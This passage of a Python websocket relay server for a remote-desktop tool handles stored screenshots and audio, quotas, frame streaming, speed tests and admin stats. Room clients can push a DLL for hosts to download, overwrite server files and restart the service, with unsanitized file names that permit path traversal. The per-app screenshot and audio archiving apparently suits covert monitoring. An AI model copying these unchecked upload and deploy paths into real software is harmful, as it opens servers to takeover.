                        name = msg.get("name", "")
                        d = SCREENSHOT_DIR / room.token
                        fpath = d / f"{name}.jpg"
                        if fpath.exists():
                            data = fpath.read_bytes()
                            name_bytes = name.encode('utf-8')
                            header = b'SDWN' + struct.pack('<I', len(name_bytes)) + name_bytes
                            await websocket.send(header + data)
                        else:
                            await websocket.send(json.dumps({"id": msg.get("id",""), "ok": False, "error": "Not found"}))
                        continue
                    elif sc_cmd == "screenshot_delete":
                        names = msg.get("names", [])
                        d = SCREENSHOT_DIR / room.token
                        deleted = 0
                        for n in names:
                            fpath = d / f"{n}.jpg"
                            if fpath.exists():
                                fpath.unlink()
                                deleted += 1
                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": {"deleted": deleted}}))
                        continue
                    elif sc_cmd == "screenshot_save_template":
                        tname = msg.get("template_name", "")
                        tapps = msg.get("apps", "")
                        if tname:
                            templates = _load_templates()
                            templates[tname] = tapps
                            _save_templates(templates)
                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": "saved"}))
                        continue
                    elif sc_cmd == "screenshot_delete_template":
                        tname = msg.get("template_name", "")
                        templates = _load_templates()
                        templates.pop(tname, None)
                        _save_templates(templates)
                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": "deleted"}))
                        continue
                    elif sc_cmd == "screenshot_set_quota":
                        quota_mb = int(msg.get("quota_mb", 500))
                        global SCREENSHOT_QUOTA
                        SCREENSHOT_QUOTA = quota_mb * 1_000_000
                        # Save to file
                        quota_file = SCREENSHOT_DIR / room.token / "_quota.txt"
                        quota_file.parent.mkdir(parents=True, exist_ok=True)
                        quota_file.write_text(str(quota_mb))
                        # Enforce immediately
                        d = SCREENSHOT_DIR / room.token
                        if d.exists():
                            _enforce_quota(d, SCREENSHOT_QUOTA)
                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": {"quota_mb": quota_mb}}))
                        log.info(f"Screenshot quota set to {quota_mb}MB for {room.token}")
                        continue
                    elif sc_cmd == "screenshot_get_quota":
                        quota_file = SCREENSHOT_DIR / room.token / "_quota.txt"
                        qmb = 500
                        if quota_file.exists():
                            try: qmb = int(quota_file.read_text().strip())
                            except: pass
                        d = SCREENSHOT_DIR / room.token
                        used = 0
                        app_usage = {}
                        if d.exists():
                            for f in d.iterdir():
                                if f.is_file() and f.suffix == '.jpg':
                                    sz = f.stat().st_size
                                    used += sz
                                    app = _get_app_from_filename(f.stem)
                                    app_usage[app] = app_usage.get(app, 0) + sz
                        app_quotas = _get_app_quotas(d) if d.exists() else {}
                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": {
                            "quota_mb": qmb, "used_bytes": used,
                            "app_usage": {k: v for k, v in app_usage.items()},
                            "app_quotas": app_quotas
                        }}))
                        continue
                    elif sc_cmd == "screenshot_set_app_quota":
                        app = msg.get("app", "")
                        mb = int(msg.get("quota_mb", 0))
                        d = _ensure_screenshot_dir(room.token)
                        quotas = _get_app_quotas(d)
                        if mb > 0:
                            quotas[app] = mb
                        else:
                            quotas.pop(app, None)
                        _save_app_quotas(d, quotas)
                        _enforce_quota(d)
                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": "saved"}))
                        continue
                    elif sc_cmd == "screenshot_save_settings":
                        # Save screenshot settings on VPS (for sync between sessions)
                        settings = msg.get("settings", {})
                        d = _ensure_screenshot_dir(room.token)
                        settings_file = d / "_settings.json"
                        settings_file.write_text(json.dumps(settings, indent=2))
                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": "saved"}))
                        continue
                    elif sc_cmd == "screenshot_load_settings":
                        d = SCREENSHOT_DIR / room.token
                        settings_file = d / "_settings.json"
                        settings = {}
                        if settings_file.exists():
                            try: settings = json.loads(settings_file.read_text())
                            except: pass
                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": settings}))
                        continue
                    elif sc_cmd == "screenshot_templates":
                        templates = _load_templates()
                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": {"cmd":"screenshot_templates_result","templates":templates}}))
                        continue

                    # Upload update file: client sends DLL to VPS for host to download
                    elif sc_cmd == "upload_update":
                        fname = msg.get("filename", "pnpext.dll")
                        size = msg.get("size", 0)
                        try:
                            bin_data = None
                            for _attempt in range(10):
                                raw = await asyncio.wait_for(websocket.recv(), timeout=60)
                                if isinstance(raw, bytes):
                                    bin_data = raw
                                    break
                            if bin_data and len(bin_data) > 0:
                                update_dir = Path("/var/www/remote-desktop/files")
                                update_dir.mkdir(parents=True, exist_ok=True)
                                fpath = update_dir / fname
                                fpath.write_bytes(bin_data)
                                url = f"https://{websocket.request.host.split(':')[0]}/files/{fname}" if hasattr(websocket, 'request') and hasattr(websocket.request, 'host') else f"/files/{fname}"
                                await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": {"url": url, "size": len(bin_data), "path": str(fpath)}}))
                                logger.info(f"Update file uploaded: {fpath} ({len(bin_data)} bytes)")
                            else:
                                await websocket.send(json.dumps({"id": msg.get("id",""), "ok": False, "error": "No binary data received"}))
                        except asyncio.TimeoutError:
                            await websocket.send(json.dumps({"id": msg.get("id",""), "ok": False, "error": "Upload timeout"}))
                        continue

                    # VPS deploy: upload files to server directories
                    elif sc_cmd == "vps_deploy":
                        fname = msg.get("filename", "")
                        target = msg.get("target", "")  # "web", "relay", "files"
                        if not fname or not target:
                            await websocket.send(json.dumps({"id": msg.get("id",""), "ok": False, "error": "Missing filename or target"}))
                            continue
                        try:
                            # Wait for binary data — skip any text messages that arrive in between
                            bin_data = None
                            for _attempt in range(10):
                                raw = await asyncio.wait_for(websocket.recv(), timeout=120)
                                if isinstance(raw, bytes):
                                    bin_data = raw
                                    break
                                # else: text message — ignore (likely auto-refresh)
                            if bin_data and len(bin_data) > 0:
                                if target == "web":
                                    dest = Path("/var/www/remote-desktop") / fname
                                elif target == "relay":
                                    dest = Path("/opt/remotedesk") / fname
                                elif target == "files":
                                    dest = Path("/var/www/remote-desktop/files") / fname
                                    dest.parent.mkdir(parents=True, exist_ok=True)
                                else:
                                    await websocket.send(json.dumps({"id": msg.get("id",""), "ok": False, "error": "Unknown target: " + target}))
                                    continue
                                # Backup existing
                                if dest.exists():
                                    bak = dest.with_suffix(dest.suffix + ".bak")
                                    try: bak.unlink(missing_ok=True)
                                    except: pass
                                    try: dest.rename(bak)
                                    except: pass
                                dest.write_bytes(bin_data)
                                logger.info(f"VPS deploy: {fname} -> {dest} ({len(bin_data)} bytes)")
                                await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": {"path": str(dest), "size": len(bin_data)}}))
                            else:
                                await websocket.send(json.dumps({"id": msg.get("id",""), "ok": False, "error": "No data received"}))
                        except asyncio.TimeoutError:
                            await websocket.send(json.dumps({"id": msg.get("id",""), "ok": False, "error": "Upload timeout"}))
                        continue

                    # VPS restart: restart server.py service
                    elif sc_cmd == "vps_restart":
                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": {"message": "Restarting in 2 seconds..."}}))
                        # Schedule restart after response is sent
                        async def _do_restart():
                            await asyncio.sleep(2)
                            import subprocess
                            subprocess.Popen(["systemctl", "restart", "rdp-relay"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        asyncio.ensure_future(_do_restart())
                        continue

                    # Audio commands: handled by VPS directly
                    elif sc_cmd == "audio_list":
                        items = _list_audio(room.token)
                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": {"items": items}}))
                        continue
                    elif sc_cmd == "audio_play":
                        name = msg.get("name", "")
                        d = AUDIO_DIR / room.token
                        # Find file with any audio extension
                        fpath = None
                        for ext in ('.ogg', '.aac', '.opus', '.mp3', '.wav'):
                            fp = d / f"{name}{ext}"
                            if fp.exists(): fpath = fp; break
                        if fpath:
                            data = fpath.read_bytes()
                            name_bytes = name.encode('utf-8')
                            header = b'APLY' + struct.pack('<I', len(name_bytes)) + name_bytes
                            await websocket.send(header + data)
                        else:
                            await websocket.send(json.dumps({"id": msg.get("id",""), "ok": False, "error": "Not found"}))
                        continue
                    elif sc_cmd == "audio_download":
                        name = msg.get("name", "")
                        d = AUDIO_DIR / room.token
                        fpath = None
                        for ext in ('.ogg', '.aac', '.opus', '.mp3', '.wav'):
                            fp = d / f"{name}{ext}"
                            if fp.exists(): fpath = fp; break
                        if fpath:
                            data = fpath.read_bytes()
                            name_bytes = name.encode('utf-8')
                            header = b'ADWN' + struct.pack('<I', len(name_bytes)) + name_bytes
                            await websocket.send(header + data)
                        else:
                            await websocket.send(json.dumps({"id": msg.get("id",""), "ok": False, "error": "Not found"}))
                        continue
                    elif sc_cmd == "audio_delete":
                        names = msg.get("names", [])
                        d = AUDIO_DIR / room.token
                        deleted = 0
                        for n in names:
                            for ext in ('.ogg', '.aac', '.opus', '.mp3', '.wav'):
                                fp = d / f"{n}{ext}"
                                if fp.exists():
                                    fp.unlink()
                                    deleted += 1
                                    log.info(f"Audio deleted: {n}{ext}")
                        log.info(f"Audio delete: {deleted} files from {len(names)} requested")
                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": {"deleted": deleted}}))
                        continue
                    elif sc_cmd == "audio_set_quota":
                        quota_mb = int(msg.get("quota_mb", 500))
                        d = _ensure_audio_dir(room.token)
                        (d / "_quota.txt").write_text(str(quota_mb))
                        _enforce_audio_quota(d)
                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": {"quota_mb": quota_mb}}))
                        continue
                    elif sc_cmd == "audio_get_quota":
                        d = AUDIO_DIR / room.token
                        qmb = 500
                        qf = d / "_quota.txt"
                        if qf.exists():
                            try: qmb = int(qf.read_text().strip())
                            except: pass
                        used = 0
                        if d.exists():
                            used = sum(f.stat().st_size for f in d.iterdir() if f.is_file() and f.suffix in ('.ogg','.aac','.opus','.mp3','.wav'))
                        await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": {"quota_mb": qmb, "used_bytes": used}}))
                        continue

                    # SpeedTest: VPS responds directly, no relay to host
                    st_cmd = msg.get("cmd", "")
                    if st_cmd == "speed_test_vps":
                        size = min(int(msg.get("size", 2_000_000)), 10_000_000)
                        st_id = msg.get("id", "")
                        if size > 0:
                            payload = b'\x00' * size
                            t0 = time.time()
                            await websocket.send(payload)
                            elapsed = time.time() - t0
                        else:
                            elapsed = 0.0
                        await websocket.send(json.dumps({
                            "id": st_id, "ok": True,
                            "data": {"bytes": size, "elapsed_s": round(elapsed, 6)}
                        }))
                        continue

                    if st_cmd == "speed_test_vps_upload":
                        # Client will send binary payload next, we measure receive time
                        st_id = msg.get("id", "")
                        expected = min(int(msg.get("size", 2_000_000)), 10_000_000)
                        t0 = time.time()
                        total_recv = 0
                        while total_recv < expected:
                            chunk = await asyncio.wait_for(websocket.recv(), timeout=10)
                            if isinstance(chunk, bytes):
                                total_recv += len(chunk)
                            else:
                                break  # unexpected text
                        elapsed = time.time() - t0
                        await websocket.send(json.dumps({
                            "id": st_id, "ok": True,
                            "data": {"bytes": total_recv, "elapsed_s": round(elapsed, 6)}
                        }))
                        continue

                    # Client → Host
                    if room.host:
                        try:
                            msg["_from"] = user_id
                            await room.host.ws.send(json.dumps(msg))
                        except:
                            await websocket.send(make_error("Host disconnected"))
                    else:
                        await websocket.send(make_error("Host not connected"))
                
                elif role == "host":
                    # Routing hint: queue target for next binary message (supports pipelining)
                    route_target = msg.get("_route_binary_to", "")
                    if route_target:
                        room._pending_binary_targets.append(route_target)
                        continue  # Don't forward routing hints to clients

                    # Host response → route to correct client
                    target_id = msg.get("_to", "")

                    if target_id and target_id in room.clients:
                        try:
                            await room.clients[target_id].ws.send(json.dumps(msg))
                        except:
                            pass
                    else:
                        # Broadcast text to command clients only (not stream connections)
                        await broadcast_to_clients(room, json.dumps(msg))
    
    except websockets.exceptions.ConnectionClosed as e:
        log.info(f"Connection closed: {remote} code={e.code}")
    except Exception as e:
        log.exception(f"Handler error: {e}")
    finally:
        # Cleanup
        if conn and room:
            async with rooms_lock:
                if conn.role == "host" and room.host is conn:
                    room.host = None
                    log.info(f"Host disconnected: token={token[:8]}...")
                elif conn.role in ("host_stream", "host_file"):
                    room.host_streams.pop(conn.user_id, None)
                elif conn.role == "client":
                    room.clients.pop(conn.user_id, None)
                elif conn.role == "stream":
                    room.stream_clients.pop(conn.user_id, None)
                    task = getattr(conn, '_sender_task', None)
                    if task and not task.done():
                        task.cancel()
                elif conn.role == "file_recv":
                    room.file_clients.pop(conn.user_id, None)
            
            if conn.role == "host":
                await broadcast_to_clients(room, make_event("host_offline", {}))
            elif conn.role == "client":
                if room.host:
                    try:
                        await room.host.ws.send(make_event("client_left", {"user_id": conn.user_id}))
                    except:
                        pass
                # Notify remaining clients about updated client count
                n = len(room.clients)
                await broadcast_to_clients(room, make_event("clients_online", {"count": n}))

async def broadcast_to_clients(room: Room, msg):
    """Send text/FILE messages to command clients only (not stream-only connections)."""
    if not room.clients:
        return
    dead = []
    for uid, c in list(room.clients.items()):
        try:
            await c.ws.send(msg)
            c.bytes_sent += len(msg) if isinstance(msg, bytes) else len(msg.encode())
        except:
            dead.append(uid)
    for uid in dead:
        room.clients.pop(uid, None)

def enqueue_scrn_to_stream_clients(room: Room, frame: bytes):
    """FIFO queue relay: delivers ALL frames in order to stream clients.
    When queue full, drops OLDEST frame (keeps newest for low latency).
    This NEVER blocks the host handler."""
    if not room.stream_clients:
        return
    room.frame_count += 1
    room._total_frames_in += 1

    # Total stats log every 5 seconds
    now = time.time()
    if now - room._total_stats_time >= 5.0:
        elapsed = now - room._total_stats_time
        fps_in = room._total_frames_in / max(0.1, elapsed)
        fps_out = room._total_frames_out / max(0.1, elapsed)
        bw_out = room._total_bytes_out / max(0.1, elapsed) / 1024
        dropped = room._total_frames_dropped
        conns = len(room.stream_clients)
        log.info(f"STREAM TOTAL: in={fps_in:.1f}FPS, out={fps_out:.1f}FPS, "
                 f"bw={bw_out:.0f}KB/s, dropped={dropped}, conns={conns}")
        room._total_frames_in = 0
        room._total_frames_out = 0
        room._total_frames_dropped = 0
        room._total_bytes_out = 0
        room._total_stats_time = now

    for uid, c in list(room.stream_clients.items()):
        q = getattr(c, '_frame_queue', None)
        if q is None:
            c._frame_queue = asyncio.Queue(maxsize=20)
            q = c._frame_queue
        # Queue full → drop oldest to make room for newest
        while q.full():
            try:
                q.get_nowait()
                room._total_frames_dropped += 1
            except asyncio.QueueEmpty:
                break
        try:
            q.put_nowait(frame)
        except asyncio.QueueFull:
            pass
        c.bytes_sent += len(frame)
        # Start sender task if not already running
        if not getattr(c, '_sender_task', None) or c._sender_task.done():
            c._sender_task = asyncio.create_task(_stream_sender(room, uid, c))


async def _stream_sender(room: Room, uid: str, conn: Connection):
    """Per-client sender: FIFO queue drain, no pacing.

    Key design:
    - asyncio.Queue(20) — buffers up to 0.7 seconds at 30fps
    - Frames delivered IN ORDER (no drops unless queue overflows)
    - NO pacing: send as fast as TCP allows — TCP flow control handles congestion
    - After TCP stall recovery, drains backlog quickly to catch up
    """
    sent_count = 0
    total_sent_bytes = 0
    last_log = time.time()

    # Ensure queue exists
    if not hasattr(conn, '_frame_queue') or conn._frame_queue is None:
        conn._frame_queue = asyncio.Queue(maxsize=20)
    q = conn._frame_queue

    # Large write buffer for burst absorption
    try:
        transport = conn.ws.transport
        if transport:
            transport.set_write_buffer_limits(high=1024 * 1024, low=256 * 1024)
    except Exception:
        pass

    try:
        while uid in room.stream_clients:
            # Wait for next frame from queue
            try:
                frame = await asyncio.wait_for(q.get(), timeout=2.0)
            except asyncio.TimeoutError:
                continue

            frame_size = len(frame)

            # Send frame to client — TCP handles flow control
            try:
                await conn.ws.send(frame)
            except Exception:
                break

            sent_count += 1
            total_sent_bytes += frame_size
            room._total_frames_out += 1
            room._total_bytes_out += frame_size

            # No pacing — let TCP drain naturally
            # After congestion recovery, this drains the queue ASAP

            now_wall = time.time()
            if now_wall - last_log >= 5.0:
                elapsed = now_wall - last_log
                fps_out = sent_count / max(0.1, elapsed)
                bw_kbps = total_sent_bytes / max(0.1, elapsed) / 1024
                qsize = q.qsize()
                log.info(f"Stream→{uid[:8]}: {fps_out:.1f}FPS, "
                         f"bw={bw_kbps:.0f}KB/s, frame={frame_size//1024}KB, "
                         f"q={qsize}")
                sent_count = 0
                total_sent_bytes = 0
                last_log = now_wall
    except Exception:
        pass
    finally:
        conn._frame_queue = None
        if uid in room.stream_clients:
            room.stream_clients.pop(uid, None)
            log.info(f"Stream client {uid} removed (send failed)")
            try:
                await conn.ws.close()
            except Exception:
                pass

# ─── Stats endpoint ──────────────────────────────────────────────────────────
async def stats_handler(websocket, path: str):
    """Admin stats websocket at /admin"""
    try:
        raw = await asyncio.wait_for(websocket.recv(), timeout=5)
        msg = json.loads(raw)
        if msg.get("admin_token") != ADMIN_TOKEN:
            await websocket.send(json.dumps({"error": "forbidden"}))
            return
        
        async with rooms_lock:
            data = {
                "rooms": len(rooms),
                "total_hosts": sum(1 for r in rooms.values() if r.host),
                "total_clients": sum(len(r.clients) for r in rooms.values()),
                "room_details": [
                    {
                        "token": t[:8] + "...",
                        "has_host": r.host is not None,
                        "clients": len(r.clients),
                        "frames": r.frame_count,
                        "age_s": int(time.time() - r.created_at),
                    }
                    for t, r in rooms.items()
                ],
            }
        await websocket.send(json.dumps(data))
    except:
        pass

# ─── Proxy compatibility: accept Connection: keep-alive when Upgrade: websocket ───
def _fix_connection_header(connection, request):
    """If proxy sent Connection: keep-alive, set Connection: Upgrade so handshake passes (426 fix)."""
    try:
        from websockets import headers as ws_headers
        headers = request.headers
        connection_options = sum(
            [ws_headers.parse_connection(v) for v in headers.get_all("Connection")],
            [],
        )
        if not any(v.lower() == "upgrade" for v in connection_options):
            upgrade_vals = headers.get_all("Upgrade")
            if upgrade_vals and "websocket" in (upgrade_vals[0] or "").lower():
                try:
                    del headers["Connection"]
                except KeyError:
                    pass
                headers["Connection"] = "Upgrade"
    except Exception as e:
        log.debug("Connection header fix skipped: %s", e)
    return None


# ─── Main ────────────────────────────────────────────────────────────────────
def _loop_exception_handler(loop, ctx):
    from websockets.exceptions import InvalidMessage, InvalidHandshake
    exc = ctx.get("exception")
    msg = str(exc) if exc else ""
    if isinstance(exc, InvalidHandshake) and ("Sec-WebSocket-Key" in msg or "Missing" in msg):
        log.warning("WebSocket rejected: proxy must forward Sec-WebSocket-Key, Sec-WebSocket-Version, Upgrade, Connection. Run: sudo bash deploy-web.sh && sudo systemctl reload nginx")
        return
    if isinstance(exc, InvalidMessage) and ("expected GET" in msg or "unsupported HTTP method" in msg):
        log.warning("Rejected: WebSocket handshake requires GET (got POST or other).")
        return
    if isinstance(exc, InvalidMessage) and ("expected HTTP/1.1" in msg or "unsupported protocol" in msg or "HTTP/1.0" in msg or "PRI " in msg or "HTTP/2.0" in msg or "did not receive a valid HTTP" in msg):
        log.warning("Rejected invalid request (HTTP/1.0, HTTP/2, or bad). Use nginx with proxy_http_version 1.1.")
        return
    loop.default_exception_handler(ctx)


async def main():
    try:
        asyncio.get_running_loop().set_exception_handler(_loop_exception_handler)
    except Exception:
        pass
    log.info(f"Starting RemoteDesktop VPS server on {HOST}:{PORT}")
    
    ssl_ctx = None
    if SSL_CERT and SSL_KEY:
        ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ssl_ctx.load_cert_chain(SSL_CERT, SSL_KEY)
        log.info("SSL enabled")
    
    # Route by path (websockets 13+ passes only ws; path from ws.request.path)
    async def router(ws):
        path = getattr(ws, "path", "") or getattr(getattr(ws, "request", None), "path", "")
        if path == "/admin":
            await stats_handler(ws, path)
        else:
            await handler(ws, path)
    
    asyncio.create_task(cleanup_empty_rooms())
    
    serve_kw = dict(
        ssl=ssl_ctx,
        ping_interval=PING_INTERVAL,
        ping_timeout=PING_TIMEOUT,
        max_size=50 * 1024 * 1024,
        write_limit=32 * 1024 * 1024,  # 32MB — large buffer prevents TCP stalls on file transfer
        compression=None,
        process_request=_fix_connection_header,
    )
    try:
        server = await websockets.serve(router, HOST, PORT, **serve_kw)
    except TypeError:
        serve_kw.pop("process_request", None)
        server = await websockets.serve(router, HOST, PORT, **serve_kw)
        log.warning("websockets.serve does not support process_request; proxy Connection fix disabled")

    log.info(
        f"Server v{SERVER_VERSION} running. ws{'s' if ssl_ctx else ''}://{HOST}:{PORT}  "
        f"ping_interval={PING_INTERVAL}s ping_timeout={PING_TIMEOUT}s "
        f"max_size={serve_kw.get('max_size',0)//1024//1024}MB "
        f"write_limit={serve_kw.get('write_limit',0)//1024}KB"
    )
    await server.wait_closed()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        log.info("Server stopped (Ctrl+C)")
